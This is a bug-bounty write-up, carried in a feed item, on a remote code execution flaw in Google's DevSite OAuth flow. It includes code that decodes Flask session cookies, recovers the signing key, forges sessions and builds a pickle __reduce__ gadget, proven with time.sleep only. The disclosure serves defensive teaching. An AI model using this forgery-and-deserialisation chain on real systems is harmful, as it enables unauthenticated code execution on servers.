        <item>
            <title><![CDATA[I Found a $90k Remote Code Execution Vulnerability in Google (144 pts)]]></title>
            <link>https://simonkoeck.com/writeups/google-devsite-flask-session-pickle-rce</link>
            <guid>50052638</guid>
            <pubDate>Mon, 12 Oct 2026 07:28:53 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://simonkoeck.com/writeups/google-devsite-flask-session-pickle-rce">https://simonkoeck.com/writeups/google-devsite-flask-session-pickle-rce</a>, See on <a href="https://news.ycombinator.com/item?id=50052638">Hacker News</a></p>
<div id="readability-page-1" class="page"><div> 
  <h2 id="how-i-found-it">How I found it</h2>
<p>I was mapping the OAuth flow that Google’s developer docs sites all share. You hit <code>/oauth2authorize</code>, it sets a Flask session cookie and redirects you to Google’s sign-in page. No account needed:</p>
<pre tabindex="0" data-language="bash"><code><span><span>curl</span><span> -s</span><span> -D</span><span> headers.txt</span><span> -o</span><span> /dev/null</span><span> \</span></span>
<span><span>  'https://developers.google.com/oauth2authorize?return_url=%2F'</span></span></code></pre>
<p>The cookie is what caught my eye. Flask’s usual three-part <code>session=&lt;payload&gt;.&lt;timestamp&gt;.&lt;signature&gt;</code>, but about 1,200 bytes, way more than you need for a CSRF token and a return URL. So I decoded it.</p>
<p>Flask session cookies are signed, not encrypted, so the contents are right there for anyone holding one. The leading dot means the payload is zlib-compressed:</p>
<pre tabindex="0" data-language="python"><code><span><span>import</span><span> base64</span></span>
<span><span>import</span><span> json</span></span>
<span><span>import</span><span> pickletools</span></span>
<span><span>import</span><span> zlib</span></span>
<span></span>
<span><span>payload, timestamp, signature </span><span>=</span><span> cookie.rsplit(</span><span>"."</span><span>, </span><span>2</span><span>)</span></span>
<span></span>
<span><span>def</span><span> b64decode</span><span>(value):</span></span>
<span><span>    return</span><span> base64.urlsafe_b64decode(value </span><span>+</span><span> "="</span><span> *</span><span> (</span><span>-</span><span>len</span><span>(value) </span><span>%</span><span> 4</span><span>))</span></span>
<span></span>
<span><span>compressed </span><span>=</span><span> payload.startswith(</span><span>"."</span><span>)</span></span>
<span><span>raw </span><span>=</span><span> b64decode(payload[</span><span>1</span><span>:] </span><span>if</span><span> compressed </span><span>else</span><span> payload)</span></span>
<span><span>session </span><span>=</span><span> json.loads(zlib.decompress(raw) </span><span>if</span><span> compressed </span><span>else</span><span> raw)</span></span></code></pre>
<p>That gave me:</p>
<pre tabindex="0" data-language="json"><code><span><span>{</span></span>
<span><span>  "_permanent"</span><span>: </span><span>true</span><span>,</span></span>
<span><span>  "google_oauth2_csrf_token"</span><span>: </span><span>"..."</span><span>,</span></span>
<span><span>  "google_oauth2_flow_&lt;csrf&gt;"</span><span>: {</span></span>
<span><span>    " b"</span><span>: </span><span>"..."</span></span>
<span><span>  }</span></span>
<span><span>}</span></span></code></pre>
<p>The <code>" b"</code> key is Flask tagging a bytes value. Base64-decoding it gave me a pickle, and <code>pickletools.dis</code> printed an <code>oauth2client.client.OAuth2WebServerFlow</code> object with its fields:</p>
<pre tabindex="0" data-language="text"><code><span><span>client_id     = "&lt;redacted&gt;.apps.googleusercontent.com"</span></span>
<span><span>client_secret = b"&lt;redacted&gt;"</span></span></code></pre>
<p>The cookie contained a pickle-serialized payload, which was bad enough on its own. It also carried Google’s OAuth <code>client_id</code> and <code>client_secret</code> in plaintext. (The secret is redacted here; it was still live at the time of writing.)</p>
<p>I tried the client secret as the Flask <code>SECRET_KEY</code>, and the signature on the issued cookie validated against it. The signing key was stored inside the object it signs.</p>
<h2 id="one-secret-two-jobs">One secret, two jobs</h2>
<p>A client secret leaking in a cookie is a finding on its own. The part that mattered was that the same value verified the signature, so I nailed that down properly instead of trusting a lucky guess.</p>
<p>Flask signs through <code>itsdangerous</code> with the <code>cookie-session</code> key derivation, so I recomputed the signature offline:</p>
<pre tabindex="0" data-language="python"><code><span><span>import</span><span> hmac</span></span>
<span></span>
<span><span>derived_key </span><span>=</span><span> hmac.digest(client_secret, </span><span>b</span><span>"cookie-session"</span><span>, </span><span>"sha1"</span><span>)</span></span>
<span><span>expected </span><span>=</span><span> hmac.digest(</span></span>
<span><span>    derived_key,</span></span>
<span><span>    f</span><span>"</span><span>{</span><span>payload</span><span>}</span><span>.</span><span>{</span><span>timestamp</span><span>}</span><span>"</span><span>.encode(),</span></span>
<span><span>    "sha1"</span><span>,</span></span>
<span><span>)</span></span></code></pre>
<p><code>expected</code> came out byte-for-byte identical to the signature on the cookie I’d been handed seconds earlier. To be sure it wasn’t a fluke I flipped one character of the signature (rejected) and re-signed the original payload with the recovered secret (accepted). Session integrity was gone. I could set every key and value in the session and still produce a signature the server would take.</p>
<h2 id="from-forged-cookie-to-code-execution">From forged cookie to code execution</h2>
<p>The callback reads the flow back out of the session and unpickles it:</p>
<pre tabindex="0" data-language="text"><code><span><span>session cookie</span></span>
<span><span>  -&gt; verify Flask signature</span></span>
<span><span>  -&gt; read google_oauth2_flow_&lt;csrf&gt;</span></span>
<span><span>  -&gt; base64-decode the bytes</span></span>
<span><span>  -&gt; pickle.loads(...)</span></span></code></pre>
<p>That <code>pickle.loads</code> is only “safe” as long as nobody else can forge a valid cookie. Once the key is public, that assumption is worthless. I built my own session with a made-up CSRF token and put whatever pickle I wanted under the matching flow key:</p>
<pre tabindex="0" data-language="python"><code><span><span>session </span><span>=</span><span> {</span></span>
<span><span>    "_permanent"</span><span>: </span><span>True</span><span>,</span></span>
<span><span>    "google_oauth2_csrf_token"</span><span>: </span><span>"attacker-chosen"</span><span>,</span></span>
<span><span>    "google_oauth2_flow_attacker-chosen"</span><span>: {</span></span>
<span><span>        " b"</span><span>: base64.b64encode(attacker_blob).decode()</span></span>
<span><span>    },</span></span>
<span><span>}</span></span></code></pre>
<p>The <code>state</code> parameter is mine too, so nothing needs to line up on the server’s end. It checks my signature, finds my flow entry, and passes the bytes to <code>pickle.loads</code>.</p>
<p>If you haven’t played with pickle before: the <code>REDUCE</code> opcode names a callable and its arguments, and unpickling just calls it. A public signing key plus this sink is unauthenticated RCE.</p>
<p>I wasn’t about to run commands on Google’s production, so I proved it with time. The payload reduced to <code>time.sleep(N)</code>:</p>
<pre tabindex="0" data-language="python"><code><span><span>class</span><span> Sleep</span><span>:</span></span>
<span><span>    def</span><span> __init__</span><span>(self, seconds):</span></span>
<span><span>        self</span><span>.seconds </span><span>=</span><span> seconds</span></span>
<span></span>
<span><span>    def</span><span> __reduce__</span><span>(self):</span></span>
<span><span>        return</span><span> (time.sleep, (</span><span>self</span><span>.seconds,))</span></span></code></pre>
<p>Same forged session every time, only the number changed:</p>
<pre tabindex="0" data-language="text"><code><span><span>time.sleep(0) -&gt; 0.207 s</span></span>
<span><span>time.sleep(3) -&gt; 3.193 s</span></span>
<span><span>time.sleep(5) -&gt; 5.194 s</span></span>
<span><span>time.sleep(8) -&gt; 8.283 s</span></span></code></pre>
<p>The response time tracked the number in the pickle, which only happens if the server imported <code>time</code> and actually called <code>sleep(N)</code>.</p>
<p>Then the controls, to rule out a slow endpoint or jitter:</p>
<ul>
<li>No cookie: <code>Invalid request</code>.</li>
<li>One flipped byte in the signature: <code>Invalid request</code>.</li>
<li>Valid signature, no flow entry: <code>Invalid request state</code>.</li>
<li>Valid signature with the real flow: reached Google’s token exchange and failed later with <code>invalid_grant</code> on my fake auth code.</li>
<li>Valid signature with the sleep payload: delayed by exactly the number I picked.</li>
</ul>
<h2 id="how-far-it-went">How far it went</h2>
<p>This isn’t a single app, it’s the shared DevSite platform, so the key from <code>developers.google.com</code> signed valid sessions on:</p>
<ul>
<li><code>firebase.google.com</code></li>
<li><code>developer.android.com</code></li>
<li><code>source.android.com</code></li>
<li><code>docs.partner.android.com</code></li>
</ul>
<h2 id="fixing-it">Fixing it</h2>
<p>Four things had to change, and they stack:</p>
<ol>
<li>Rotate both exposed OAuth client secrets and kill every session signed with them.</li>
<li>Give each deployment its own high-entropy Flask <code>SECRET_KEY</code> from a server-side store, with nothing to do with an OAuth credential.</li>
<li>Keep the OAuth flow object on the server. The cookie should hold an opaque reference and nothing sensitive.</li>
<li>Drop <code>pickle</code> for anything crossing a client boundary. A data-only format with a schema check makes a forged cookie inert.</li>
</ol>
<p>Any one of those would have broken the chain. All four lined up, and that’s how two GET requests end up running code on Google’s servers.</p>
<h2 id="timeline">Timeline</h2>
<div> <ol> <li> <span></span> <time> Aug 6, 2026 · 22:48 </time> <p>Report submitted</p>  </li><li> <span></span> <time> Aug 7, 2026 · 08:12 </time> <p>Triaged</p>  </li><li> <span></span> <time> Aug 7, 2026 · 16:23 </time> <p>Accepted</p>  </li><li> <span></span> <time> Aug 27, 2026 </time> <p>Reward decided: $90,000</p> <p>Normal Google Applications (T2), S0 RCE: $75,000 base × 1.2 for exceptional report quality.</p> </li><li> <span></span> <time> Oct 7, 2026 · 15:20 </time> <p>Fixed</p>  </li> </ol> </div>
<p>Thanks to the Google Bug Hunters team and the DevSite engineers for investigating and fixing this issue.</p>
 </div></div>]]></description>
